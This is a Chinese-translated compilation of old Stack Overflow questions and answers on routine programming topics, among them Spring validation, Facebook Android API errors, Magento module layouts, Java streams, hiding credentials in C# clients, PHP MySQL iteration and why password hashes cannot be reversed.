## 回答 #5

> 赞同：1
> 
> 时间：2013-11-13T17:52:03.287

查找 Spring Mvc 验证的完整示例

```
import org.springframework.validation.Errors;
import org.springframework.validation.ValidationUtils;
import org.springframework.validation.Validator;
import com.technicalkeeda.bean.Login;

public class LoginValidator implements Validator {
    public boolean supports(Class aClass) {
        return Login.class.equals(aClass);
    }

    public void validate(Object obj, Errors errors) {
        Login login = (Login) obj;
        ValidationUtils.rejectIfEmptyOrWhitespace(errors, "userName",
                "username.required", "Required field");
        ValidationUtils.rejectIfEmptyOrWhitespace(errors, "userPassword",
                "userpassword.required", "Required field");
    }
}

public class LoginController extends SimpleFormController {
    private LoginService loginService;

    public LoginController() {
        setCommandClass(Login.class);
        setCommandName("login");
    }

    public void setLoginService(LoginService loginService) {
        this.loginService = loginService;
    }

    @Override
    protected ModelAndView onSubmit(Object command) throws Exception {
        Login login = (Login) command;
        loginService.add(login);
        return new ModelAndView("loginsucess", "login", login);
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-02-15T14:02:36.780

将此 bean 放入您的配置类中。

```
 @Bean
  public Validator localValidatorFactoryBean() {
    return new LocalValidatorFactoryBean();
  } 
```

然后你可以使用

```
 <T> BindingResult validate(T t) {
    DataBinder binder = new DataBinder(t);
    binder.setValidator(validator);
    binder.validate();
    return binder.getBindingResult();
} 
```

用于手动验证 bean。然后您将在 BindingResult 中获得所有结果，您可以从那里检索。

# android - 试图获取朋友列表返回未知主机异常

> ID：12146302
> 
> 赞同：0
> 
> 时间：2012-08-27T17:05:00.643
> 
> 标签：android, facebook, json

我正在尝试获取朋友列表：

```
 private void getFriends(){

    JSONObject json_data = null;

    try
    {
        JSONObject response = Util.parseJson(facebook.request("me/friends")); // Get a friend information from facebook
        JSONArray jArray = response.getJSONArray("data");

        json_data = jArray.getJSONObject(0);
        String name = json_data.getString("name");
        Log.e("lovehate", name);

    }
    catch (MalformedURLException e)
    {
        e.printStackTrace();
    }
    catch (JSONException e)
    {
        e.printStackTrace();
    }
    catch (IOException e)
    {
        e.printStackTrace();
    }
    catch (FacebookError e)
    {
        e.printStackTrace();
    }

} 
```

此代码遇到 IOEXception -

```
 08-27 18:00:29.630: D/Facebook-Util(5068): GET URL: https://graph.facebook.com/me/friends?access_token=[REMOVED_ACCESS_TOKEN]&format=json
08-27 18:00:32.390: W/System.err(5068): java.net.UnknownHostException: graph.facebook.com
08-27 18:00:32.400: W/System.err(5068):     at java.net.InetAddress.lookupHostByName(InetAddress.java:500)
08-27 18:00:32.400: W/System.err(5068):     at java.net.InetAddress.getAllByNameImpl(InetAddress.java:297)
08-27 18:00:32.400: W/System.err(5068):     at java.net.InetAddress.getAllByName(InetAddress.java:256)
08-27 18:00:32.400: W/System.err(5068):     at org.apache.harmony.luni.internal.net.www.protocol.http.HttpConnection.<init>(HttpConnection.java:69) 
```

我的权限列表如下所示：

```
 facebook.authorize(this, new String[] {}, new DialogListener() {
                    @Override
                    public void onComplete(Bundle values) {
                          Log.e("tag","new auth stored");

                        SharedPreferences.Editor editor = mPrefs.edit();
                        editor.putString("access_token", facebook.getAccessToken());
                        editor.putLong("access_expires", facebook.getAccessExpires());
                        editor.commit();
                    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T20:38:12.210

堆栈跟踪显示您的设备/模拟器无法连接到我们的端点。确保您可以访问 Internet，并且您的应用程序具有访问 Internet 的权限。

`<uses-permission android:name="android.permission.INTERNET" />`

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-27T18:42:18.817

您的权限字符串数组为空，我不知道这是否是您的问题。我正在使用电子邮件、publish_stream 和 user_photos。另外，我使用此代码来获取朋友，这对我有用，您可以尝试一下。

```
 Bundle params = new Bundle();
            access_token = fb.getAccessToken();

            try {
                params.putString("format", "json");
                params.putString("access_token", access_token);
                String url = "https://graph.facebook.com/me/friends";
                String response = Util.openUrl(url, "GET", params);
                JSONObject json = Util.parseJson(response);
                JSONArray jsonArray = json.optJSONArray("data");

                if(jsonArray != null) {
                    for(int i = 0; i < jsonArray.length(); i++) {
                        String tempName = jsonArray.getJSONObject(i).getString("name");
                        String tempId = jsonArray.getJSONObject(i).getString("id");
                        String location = jsonArray.getJSONObject(i).getString("location");
                        System.out.println(tempName + ", " + tempId + ", " + location);
                    }
                }

                //catch stuff 
```

# ruby-on-rails - 在没有资产管道的情况下使用 wicked_pdf

> ID：12146303
> 
> 赞同：1
> 
> 时间：2012-08-27T17:05:02.557
> 
> 标签：ruby-on-rails, asset-pipeline, wicked-pdf

在gem中提交[https://github.com/mileszs/wicked_pdf/pull/68/files](https://github.com/mileszs/wicked_pdf/pull/68/files)`wicked_pdf`之后，如果没有资产管道，我将无法再工作。

有没有办法让 railtie 包含模块 WickedPdfHelper 而不是 WickedPdfHelper::Assets？（查看提交）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-24T17:01:43.367

将该文件中的非资产帮助程序复制到您的应用程序帮助程序文件之一。

这将修补 wicked_pdf_image_tag 等的行为。

# visual-studio-2010 - Visual Studio 签出解决方案并删除 SolutionInfo.cs

> ID：12146309
> 
> 赞同：1
> 
> 时间：2012-08-27T17:05:21.267
> 
> 标签：visual-studio-2010, visual-studio, tfs

当我在解决方案资源管理器中右键单击我的解决方案并选择获取最新时，Visual Studio 会获取最新的，但也会签出解决方案。

![在此处输入图像描述](../Images/c5a40a10b48e9f58c2e303deffb925ad.png)

> 替换 C:\DevTfs2010\Apps\Messaging\Subscribers\AutoTrackerProcessor\Main\AutoTrackerProcessor\SolutionItems\SolutionInfo.cs AutoTrackerProcessor.vssscc，AutoTrackerProcessor.sln 已被自动签出进行编辑。

它不仅检查解决方案，而且从解决方案文件中删除 SolutionInfo.cs 文件。这是解决方案文件的比较：

**服务器：**

![在此处输入图像描述](../Images/fd8b2b520e4943195e54b3cfaaad5af3.png)

**当地的：**

![在此处输入图像描述](../Images/20f7b2e5cd1f08699551e1454b385351.png)

为什么会这样做？

注意：我们的构建过程会更改 SolutionInfo.cs 文件，但仅更改该文件。它不会改变删除 SolutionInfo.cs 的解决方案。

# ubuntu - 我无法在 KDevelop 的内部终端中添加输入

> ID：12146310
> 
> 赞同：5
> 
> 时间：2012-08-27T17:05:26.190
> 
> 标签：ubuntu, input, terminal, kde, kdevelop

我是 KDevelop 的新手，

如何在 KDevelop 的内部终端中输入输入？

假设我有一个程序询问用户他/她的年龄？当我在 KDevelop 中执行它时，我可以看到输出（问题），但我无法添加任何输入。

当我在 Ubuntu 的终端中运行程序时，它运行良好，但我无法在 KDevelop 中输入任何内容。

我正在使用 Ubuntu 12.04 LTS、KDevelop 4.3.1、KDE ​​4.8.4。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-28T05:45:38.357

你不能。在启动配置中激活“使用外部终端”选项。

如果您想调试，则不支持 - 在这种情况下，您必须在终端中手动运行您的应用程序并附加调试器。

# java - Slick2D：初始化字体时输入安全警告

> ID：12146311
> 
> 赞同：0
> 
> 时间：2012-08-27T17:05:28.350
> 
> 标签：java, slick2d

在遵循关于自定义字体的 Slick2D 教程之后，它为我提供了以下代码来初始化它：

```
titleFont.addAsciiGlyphs();
titleFont.addGlyphs(400, 600);
titleFont.getEffects().add(new ColorEffect()); //Type safety: The method add(Object) belongs to the raw type List. References to generic type List<E> should be parameterized
titleFont.loadGlyphs(); 
```

Eclipse 在该行抛出注释警告。您能否用 Eclipse 要求我放入的任何内容替换第 3 行来回答。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:31:28.967

该警告告诉您 getEffects() 返回的列表未参数化。它是列表类型。由于该列表位于 Slick 库中，因此您无法对该警告执行任何操作。继续吧。

这是源代码，我猜你正在使用 Unicode 字体：[https ://bob.newdawnsoftware.com/repos/slick/trunk/Slick/src/org/newdawn/slick/UnicodeFont.java](https://bob.newdawnsoftware.com/repos/slick/trunk/Slick/src/org/newdawn/slick/UnicodeFont.java)

您可以亲自看到效果存储在列表中，而不是被参数化。

我最初的评论是错误的，错误不是因为类型擦除，而是因为效果列表是原始的。看到这个：[什么是原始类型，为什么我们不应该使用它？](https://stackoverflow.com/questions/2770321/what-is-a-raw-type-and-why-shouldnt-we-use-it)

# magento - Magento 不显示自定义块

> ID：12146324
> 
> 赞同：0
> 
> 时间：2012-08-27T17:06:34.507
> 
> 标签：magento, module, block

我正在尝试使用一个像模块一样的“hello world”来学习如何制作模块。我在 Mac OSX 10.6 本地服务器上安装了相当全新的 Magento 1.7。我正在关注[Pierrefay 的教程](http://www.pierrefay.com/magento-developper-guide-howto-tutorial-5)，但无法显示该块。我一直在网上，但没有任何工作。该模块的页面仅显示带有“狗”和“返校”广告的默认外观。我有 Alan 的 Layoutviewer 模块。我目前处于调试模式并疯狂地清空缓存。我已经告诉麦格了。无论如何，不​​要缓存任何东西。我已经成功地达到了不生成错误消息的地步（我也处于调试模式并且已启动 execption.log 和 system.log）。

我的控制器：

```
<?php
class Nationwide_Cartonplugin_IndexController extends Mage_Core_Controller_Front_Action {
    public function indexAction ()
   {
     $this->loadLayout();
     $this->renderLayout();
     //var_dump(Mage::getSingleton('core/layout')->getUpdate()->getHandles());
    //exit("bailing early at ".__LINE__." in ".__FILE__);
     //echo "Carton Exists";

     //Mage::log(
     //   $this->getLayout()->getUpdate()->getHandles(),
     //   null, ‘layout.log’ );
     //Mage::log(
     //  $this->getLayout()->getUpdate()->asString(),
     //  null, ‘layout.log’ );
   }
   public function mamethodeAction ()
   {
     echo 'test mymethod';
    }
} 
```

我的配置：

```
<?xml version="1.0"?>

<config>
    <modules>
        <Nationwide_Cartonplugin>
            <version>1.1.0</version>
        </Nationwide_Cartonplugin>
    </modules>
    <global>
        <blocks>
            <cartonplugin>
                <class>Nationwide_Cartonplugin_Block</class>
            </cartonplugin>
        </blocks>
    </global>
    <frontend>
        <routers>
            <cartonplugin>
                <use>standard</use>
                <args>
                    <module>Nationwide_Cartonplugin</module>
                    <frontName>carton</frontName>
                </args>
            </cartonplugin>
        </routers>
        <layout>
            <updates>
                <cartonplugin>
                    <file>carton.xml</file>
                </cartonplugin>
            </updates>
        </layout>
    </frontend>
</config> 
```

我的布局：（frontend/default/nationalwide/layout/carton.xml）（我在管理设置中使用默认和全国）

```
<?xml version="1.0"?>

<layout version="0.1.0">
      <default>
          <reference name="content">
          </reference>
      </default>
      <cartonplugin_index_index>
           <reference name="content">
                <block output="toHtml" type="cartonplugin/myblock"  name="myblock"
                          template="cartonplugin/cartondisplay.phtml"/>
           </reference>
      </cartonplugin_index_index>
</layout> 
```

取消注释引用会生成“无效模板”错误。

我的模板：（前端/默认/国家/模板/cartonplugin/cartondisplay.phtml）

```
<?php
//echo $this->methodcarblock();
?>

 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Hello World</title>
    <style type="text/css">
        body {
            background-color:#f00;
        }
    </style>
</head>
<body>
    <div class="test1">
        <?php echo $this->methodcarblock(); ?>
    </div>
</body>
</html> 
```

我的块：

```
<?php

class Nationwide_Cartonplugin_Block_Myblock extends Mage_Core_Block_Template
{
     public function methodcarblock()
     {
         return 'informations about my block !!';
     }
} 
```

似乎我关注了网络上的所有内容，除了从索引操作中呼应之外，没有任何效果。我将不胜感激任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:22:15.643

一目了然，改变

```
<block type="cartonplugin/myblock" name="myblock" template="cartonplugin/cartondisplay.phtml"/> 
```

到

```
<block output="toHtml" type="cartonplugin/myblock" name="myblock" template="cartonplugin/cartondisplay.phtml"/> 
```

这是必要的，因为`Mage_Core_Controller_Varien_Action::renderLayout()`假设已将输出块设置为渲染的入口点。通常不需要设置输出块和方法，因为定义的**根**块`page.xml`是输出块。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T20:37:07.453

取消注释时您不会收到任何错误，因为 Magento 只是不尝试调用该块:) 所以这是一个无声错误...

事实上，正如错误所说，Magento 正在尝试访问文件 frontend/base/ **default** /template/cartonplugin/cartondisplay.phtml，这意味着如果文件 frontend/default/**全国范围内**的/template/ ，您的设计配置（我猜）不正确cartonplugin/cartondisplay.phtml 确实存在。

那么，您确定您的包/主题在系统配置、设计选项卡中正确配置了吗？确保包是“默认的”并且主题模板是“全国性的”。

下图是一个很好的配置，可以告诉 Magento 调用驻留在 frontend/default/**全国范围内**/template/ 而不是 frontend/base/ **default** /template/ 的模板（可能需要根据您现有的配置和商店视图进行一些微调)

![在此处输入图像描述](../Images/cd94d2cbb432d3c42ee408daa1b24b6a.png)

# google-chrome - Sencha Touch 文档实时预览

> ID：12146332
> 
> 赞同：0
> 
> 时间：2012-08-27T17:07:02.873
> 
> 标签：google-chrome, sencha-touch-2

我刚刚安装了带有 senchatouch 2 的 Aptana Studio3。我想使用随 Sencha sdk 安装的文档，一切似乎都显示得很好，但我无法在示例中获得实时预览。当我在煎茶网站上上线时，一切正常。我在 Windows 7 64 位下使用最新版本的 Chrome。有人会遇到类似的问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T21:00:22.417

您不能直接运行该应用程序。您需要将它托管在您自己的本地 Web 服务器上，我使用 Apache Tomcat。复制整个下载的 Sencha Touch SDK。启动服务器并点击 url。

http://{你的 ip}:{port}/AppServerName/sencha-touch-2.0.1.1/examples/kiva/index.html

这应该有效。

# java - 从输入流中取出输入流

> ID：12146335
> 
> 赞同：-1
> 
> 时间：2012-08-27T17:07:15.553
> 
> 标签：java, android

我需要从输入流中取出输入流，例如输入流 A 是 1024 字节，我需要从第 100 字节的 A 中取出输入流 B 到结束，从某个偏移量到某个结束。我在 google 和 stackoverflow 中搜索...在 java 中有没有可用的解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:24:45.443

您可以使用“skip”方法跳过前 150 个字节。这是一个例子：

```
byte[] buf = {1,2,3,4,5,6,7,8,9};
InputStream is1 = new ByteArrayInputStream(buf);
long skip = is1.skip(5);        
System.out.println(is1.read()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T19:23:55.187

如果你知道你有一个`FileInputStream`，你可以`FileChannel.position()`用来设置流将从文件中读取的位置。

```
FileInputStream in = new FileInputStream("whatever");
FileChannel channel = in.getChannel();
channel.position(10); 
```

这*不适*用于其他类型的流。

# c# - 在c#源代码中隐藏密码

> ID：12146340
> 
> 赞同：1
> 
> 时间：2012-08-27T17:07:51.160
> 
> 标签：c#, .net, passwords

我在 c# 中使用以下代码从我的网站下载文件：

```
WebClient webClient = new WebClient();
webClient.Credentials = new System.Net.NetworkCredential("username", "password");
webClient.DownloadFile("http://example.com/file.txt", "file.txt"); 
```

该文件仅在满足某些条件时才下载，因此我不希望用户能够访问我网站上的文件

我的担心是，如果古玩用户反编译代码，他将找到密码并能够访问我网站上的所有文件。

我读过保存密码的一种安全方法是存储其哈希值，但我不知道如何在此示例中实现它。

我必须采取哪些措施来确保密码安全并让用户无法找到它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:13:03.827

一个发人深省的现实：您无法像这样保护程序中包含的信息。

必须做的：选择一个用户名/密码，该用户名/密码*仅*用于访问该单个程序所需的特殊文件，*而不是*您的“访问我的整个网站”用户名和密码。

但是只要知道你所做的只是在这里增加一点障碍；任何想要检查您的程序并找到用户名和密码的人。

唯一“正确”的方法是根据用户自己的凭据进行操作；例如，他们在您自己的系统中的用户名和密码。然后，您需要根据该信息授予他们访问权限，并且您的程序需要提示他们。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:14:15.683

你根本不知道。用户给你密码来做事，而不是反过来。

如果用户必须证明“某些条件”，则将这些某些条件的证明传递给服务器，让其决定是否允许下载。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:12:42.650

没有办法阻止这种情况。如果您的程序能够在条件 X 下访问文件，则用户可以欺骗程序进入条件 X 并无论如何获取文件。你可以让它变得更难，但你不能让它变得不可能。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-27T17:18:22.077

如果数据在程序本身中，您可以认为它们已经暴露给用户。如果凭据在用户计算机上，无论您采取了多少措施来解决这个问题，总有可能找到解决方法。

您可以做的是为您的程序实现一个登录表单并为用户提供登录信息。然后，当用户输入登录信息时，在服务器端检查凭据是否存在（通常通过签入数据库），如果匹配，则向他们发送文件。

但与往常一样，用户只是与其他人共享登录信息等问题。

# php - 如何遍历 mysql_query() 结果

> ID：12146342
> 
> 赞同：0
> 
> 时间：2012-08-27T17:07:52.973
> 
> 标签：php, mysql

> **可能重复：**
> [如何通过 php 中的 mysql 查询逐行迭代](https://stackoverflow.com/questions/2285600/how-to-iterate-by-row-through-a-mysql-query-in-php)

后：

```
 $result = mysql_query($query) or die("Error: Cant query database"); 
```

我要做的就是一一遍历结果并显示以“；”分隔的值 从上到下，从左到右的顺序；

我真的很尴尬，我不得不问这个“简单”的问题，但我没有得到结果，哈哈。可能是我没有得到的返回资源的结构，谁知道呢。

我不想插入行或字段名称，我只想遍历并显示它，而不管结果如何。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:12:48.370

```
while($row = mysql_fetch_assoc($result)) {
   // Your code goes here...
   // OR
   echo "<pre>"; print_r($row); echo "</pre>";
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:14:31.783

检查： http: [//php.net/manual/de/function.mysql-query.php](http://php.net/manual/de/function.mysql-query.php)

如果要显示结果的特定列：

```
while ($row = mysql_fetch_assoc($result)) {
    echo $row['firstname'];
    echo $row['lastname'];
    echo $row['address'];
    echo $row['age'];
} 
```

或者只是整个结果集：

```
$result_set = mysql_fetch_assoc($result) or die(mysql_error());
echo '<pre>';var_dump($result_set);echo '</pre>'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:33:39.910

这是我给出的答案的修改版本，它符合我的逗号分隔规范。以防万一他们是其他人在寻找同样的东西。

```
$result = mysql_query($query) or die("Error: Cant query database");

while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) 
{
    foreach ($line as $col_value) 
    {
        echo $col_value.";";
    }   
} 
```

# time - 我使用 system() 调用函数时的运行时间是多少？

> ID：12146346
> 
> 赞同：1
> 
> 时间：2012-08-27T17:08:12.960
> 
> 标签：time, system, clock

我正在尝试计算我的代码的运行时间。我使用以下代码。

```
Gettime(start time)
loop
{
   function 1 
   function 2 
   system(compiled excuetable file1 )
   function 4 
   system(compiled excuetable file2 )
   Gettine(time2)
} 
```

然后我打印出来`time2-starttime`以获取每个步骤的时间成本。我使用不同的时间函数（时钟、gettimeofday、getusage）来测量它们。

有一个问题：我知道系统调用函数（编译的可执行文件 1 和编译的可执行文件 2）的成本高于主循环中的所有其他函数。因为它内部有自己的 gettime 函数，并且显示它的成本超过 1 秒，而总 (time2-starttime) 只给了我 0.5 秒。

那么这是否意味着（time2-starttime）我现在不包括在 system() 上花费的时间？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-07-24T06:09:11.127

我遇到了同样的问题，我解决了`gettimeofday`。例子：

```
#include <sys/time.h>
int main(){
        struct timeval tvs,tve;
        gettimeofday(&tvs,NULL);
        //system("./test");
        gettimeofday(&tve,NULL);
        double span = tve.tv_sec-tvs.tv_sec + (tve.tv_usec-tvs.tv_usec)/1000000.0;
        printf("time: %.12f\n",span);
        return 0;
} 
```

# google-chrome - webkitDeprecatedPeerConnection Chrome

> ID：12146348
> 
> 赞同：0
> 
> 时间：2012-08-27T17:08:22.937
> 
> 标签：google-chrome, p2p, webrtc

我想做一个视频平台。我正在试验**WebRTC**，将 nodejs 作为服务器运行。现在的问题是我在 Ubuntu 中的**Chrome 21**运行正常，完全没有错误，但在**Chrome 23**（在 Windows 中）中，我在客户端出现错误。

这是我的代码

```
if(typeof webkitPeerConnection === 'function') 
    pc = new webkitPeerConnection("NONE", onSignalingMessage);   
else 
    pc = new webkitDeprecatedPeerConnection("NONE", onSignalingMessage); 
```

错误发生在尝试使用函数 webkitDeprecatedPeerConnection。它说 webkitDeprecatedPeerConnection 是一个未定义的函数，这意味着它不存在。

此外，**PeerConnection**标志已启用。

```
Linux Ubuntu 12 (32 bits) 
Windows 7 Ultimate (64 bits) 
```

> *PS：对不起，我的英语，我的母语是西班牙语。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T01:16:00.263

您可以看到[Chrome 不再支持 webkitDeprecatedPeerConnection](https://groups.google.com/d/topic/discuss-webrtc/tdAKZ36hHQA/discussion)，现在！！

> 我们现在有一个新的 W3C 编辑草稿可以使用。该草案可在[http://dev.w3.org/2011/webrtc/editor/webrtc.html](http://dev.w3.org/2011/webrtc/editor/webrtc.html)找到，它使我们能够推进 PeerConnection 的实施。
> 
> 为了保持代码库的可管理性，我们将从 API 中删除 DeprecatedPeerConnection。此更改将很快影响 Canary 和 Dev 版本。较新的 JSEP API 提供了更大的灵活性并允许更轻松地封装其他协议。关于它已经写了很多。
> 
> 对于那些想要快速过渡到新 API 的人，我们建议使用我们的一位同事创建的 ROAP to JSEP JS 库。它在使用较新的 JSEP API 时抽象了 DeprecatedPeerConnection。它可以在这里找到： [http ://code.google.com/p/webrtc-samples/source/browse/#svn%2Ftrunk%2Froap-jsep](http://code.google.com/p/webrtc-samples/source/browse/#svn%2Ftrunk%2Froap-jsep)
> 
> 谢谢，
> 
> /哔叽

# php - 如何输出密码本身，而不是密码哈希？

> ID：12146349
> 
> 赞同：-3
> 
> 时间：2012-08-27T17:08:24.103
> 
> 标签：php

> **可能重复：**
> [如何以纯文本形式输出 MD5 哈希密码？](https://stackoverflow.com/questions/3126255/how-to-output-md5-hashed-password-in-plain-text)

我有一个小问题，下面是 nmy 代码是一个 '$teacherpassword' 变量，其中包含用户的密码和盐（随机字符）。

```
$teacherpassword = md5(md5("g3f".$teacherpassword."rt4")); 
```

现在假设密码是“Cricket”，那么如果我回`$teahcerpassword`显，它不会输出“Cricket”这个词，它会输出密码哈希，即“1ac30ef9e714fff0ab12b398e379f358”。

我希望它输出“Cricket”这个词。我怎样才能让它输出密码字本身而不是密码哈希？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T17:10:18.657

哈希的意义在于它是单向的。它与双向加密不同。

你不能取消散列一些东西。

[http://en.wikipedia.org/wiki/MD5](http://en.wikipedia.org/wiki/MD5)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:10:34.937

这是不可能的，哈希可以防止这种情况。散列算法将任意长度的输入缩短为恒定长度的输出。不可能做到这一点。

在正常的散列算法内部是使用的模运算符，它减少了信息计数。被删除的信息无法恢复。但是可以通过使用所谓的彩虹表来取回密码。但请注意，如果使用盐，这将更加复杂。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:13:37.467

使用散列而不是加密密码，以使其他任何人（包括系统管理员）都无法获取某人的密码。您可以匹配哈希，但不能从中检索原始密码。

这是一个特点。它提高了安全性，因为唯一可以访问原始密码的人是创建密码的人。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-27T17:12:01.860

如果您想验证用户是否输入了正确的密码......还要对输入的值进行哈希处理并匹配两个哈希值;-)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-27T17:12:24.047

您可以制作一个字典，其中包含一些单词并生成散列，但散列的一般概念是提取原始单词在计算上很困难

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-27T17:12:36.823

是不是不能输出MD5哈希。MD5 只是一种方式。如果你想要密码，你必须设置一个新密码。或者使用“开膛手约翰”来破解它......

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-27T17:11:02.157

哈希是一种单向加密。没有办法从哈希中获取密码。

# csv - 检测 .csv 文件是否实际上是 .xls (Excel) 文件

> ID：12146350
> 
> 赞同：5
> 
> 时间：2012-08-27T17:08:28.897
> 
> 标签：csv, binary-data, xls

我想检测用户是否不小心上传了标记为 .csv 的 Excel 文件。xls 文件是否有标准的二进制文件可以实现这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-12T01:55:24.747

您可以在 python 中读取 excel 文件：

[http://scienceoss.com/read-excel-files-from-python/](http://scienceoss.com/read-excel-files-from-python/)

您可以在 Perl 中读取 excel 文件：

[http://www.thegeekstuff.com/2011/12/perl-and-excel/](http://www.thegeekstuff.com/2011/12/perl-and-excel/)

[如何在 Perl 中读取 Excel 文件？](https://stackoverflow.com/questions/2134707/how-can-i-read-excel-files-in-perl)

Unix/Linux 实用程序`file`可以识别 excel 和大量其他文件。

样本输出：

`file ~/Download/*xls`

```
/home/paul/Downloads/REDACTED1.xls:          Composite Document File V2 Document, Little Endian, Os: Windows, Version 5.1, Code page: 1252, Author: Someones Name, Last Saved By: Somebody Else, Name of Creating Application: Microsoft Excel, Create Time/Date: Wed Jan 27 00:39:46 2010, Last Saved Time/Date: Sun Feb 28 13:55:47 2010, Security: 0

/home/paul/Downloads/REDACTED2.xls: Composite Document File V2 Document, Little Endian, Os: Windows, Version 1.0, Code page: -535, Author: Paul , Last Saved By: Paul , Revision Number: 3, Total Editing Time: 18:09, Create Time/Date: Wed Oct 26 23:45:51 2011, Last Saved Time/Date: Thu Oct 27 00:34:42 2011 
```

您可以简单地构建一个调用`file`并返回结果的库。

要查看`file`它是如何做到的，可以使用源代码，并且该`file`实用程序有自己的配置文件，甚至还有一个魔术字节和字符串信息的配置目录。

`apt-get source file`

./file-5.11/magic/MagDir 是一个充满魔法字节和字符串的目录，可以以多种格式查找，但在我自己的 excel 文件扫描中看到的“复合文档文件”并未在此处声明。这个目录确实有 Mac 上的 Excel、Word 和一些旧的 msdos 格式的定义文件。

`cd ./file-5.11; grep 'Composite Document File' */*`

产量：

```
src/cdf.c: * Parse Composite Document Files, the format used in Microsoft Office
src/cdf.c: * N.B. This is the "Composite Document File" format, and not the
src/cdf.h: * Parse Composite Document Files, the format used in Microsoft Office
src/cdf.h: * N.B. This is the "Composite Document File" format, and not the
src/readcdf.c:                if (file_printf(ms, "Composite Document File V2 Document")
src/readcdf.c:          if (file_printf(ms, "Composite Document File V2 Document") 
```

我建议您可以调查以确定该`file`实用程序如何检测某些 Microsoft Excel 格式。

# c# - 使用 Json、jQuery 和 Ajax 返回多个值

> ID：12146352
> 
> 赞同：0
> 
> 时间：2012-08-27T17:08:35.097
> 
> 标签：c#, ajax, arrays, json, linq-to-sql

我正在尝试使用两个 linq-to-SQL 语句将数据从数据库返回到数组，我可以在 jQuery 调用中使用该数组。我可以让 Json 返回一个数组，但我无法让它返回包含我需要列出的数量的第二个数组。

你看我在做什么，我正在创建一个树视图，列出每个部分的区域、项目和子程序。每个区域都有一个总花费，每个项目都有一个总花费，每个子程序都有一个总花费。我已经能够获得用于子程序的总金额，但项目是另一回事，因为我必须使用用于显示子程序的同一控制器来显示每个项目的总数。它看起来有点像这样。

`Area------------Jan--Feb--March--April--May--June--July--Aug--Sept--Oct--Nov--Dec`

`+Project--------Jan--Feb--March--April--May--June--July--Aug--Sept--Oct--Nov--Dec`

`++Sub-Program1--Jan--Feb--March--April--May--June--July--Aug--Sept--Oct--Nov--Dec`

`++Sub-Program2--Jan--Feb--March--April--May--June--July--Aug--Sept--Oct--Nov--Dec`

由于项目金额是子程序数量的总和，并且与列出子程序的位置不同，因此我很难填充第二个数组。下面的代码来自我的控制器，显示了我如何为填充子程序名称的数组提取数据。

```
[Authorize]
        public virtual ActionResult getAjaxPGs(string SP = null, string PG = null)
        {

            if (SP != null)
            {
                var PGList = from x in db.pg_mapping
                             where x.PG_SUB_PROGRAM == SP 
                             select x;
                                 //select x.PG.Distinct().ToArray(); // I wanted to combine the PGRow = line below with the linq to SQL code above but it didn't like the .ToArray() 

                var PGRow = PGList.Select(x => new { x.PG }).Distinct().ToArray();

                return Json(PGRow, JsonRequestBehavior.AllowGet);

            }

            return View();
        } 
```

所以这里的代码找到并输出子程序名称来代替 Sub-Program1 和 Sub-Program2。这部分需要保留，以便它输出正确的子程序名称，但现在我需要添加将在项目级别输出总金额的代码。我以为我可以将此代码添加到控制器并返回两个数组，但我做得不对，而且我尝试过的任何方法都没有奏效。

`var AmountList = from x in db.Spend_Web where x.PG == PG group x by new { x.ACCOUNTING_PERIOD, x.PG, x.Amount } into pggroup select new { accounting_period = pggroup.Key.ACCOUNTING_PERIOD, amount = pggroup.Sum(x => x.Amount) };`

然后像这样返回

`return Json(PGRow, AmountList, JsonRequestBehavior.AllowGet);`

这没有用，它抛出了一个错误，说`The best overload match for 'System.Web.MVC.Controller.Json(object,string,System.Web.MVC.JsonRequestBehavior)' has some invalid arguments`

我对所有建议完全开放，因为我尝试过的一切都没有奏效；即使一个建议将我带入一个全新的方向。老实说，我只需要一些关于如何实现预期结果的指导。我希望我已经清楚地表达了我的问题。感谢大家的时间和专业知识，请不要犹豫，要求任何额外的代码或澄清，因为我会尽可能经常地检查。

**更新**

```
public class Container
        {
            Array PARow;
            Array AmountList;

        }

public virtual ActionResult getAjaxPGs(string SP = null, string PG = null)
            {
                var PGList = from x in db.pg_mapping
                             where x.PG_SUB_PROGRAM == SP
                             select x;

                container.PGRow = PGList.Select(x => new { x.PG }).Distinct().ToArray();

                container.AmountList = from x in db.Spend_Web
                                    where x.PG == PG
                                    group x by new { x.ACCOUNTING_PERIOD, x.PG, x.Amount } into pggroup
                                    select new { accounting_period = pggroup.Key.ACCOUNTING_PERIOD, amount = pggroup.Sum(x => x.Amount) };

            } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:23:26.057

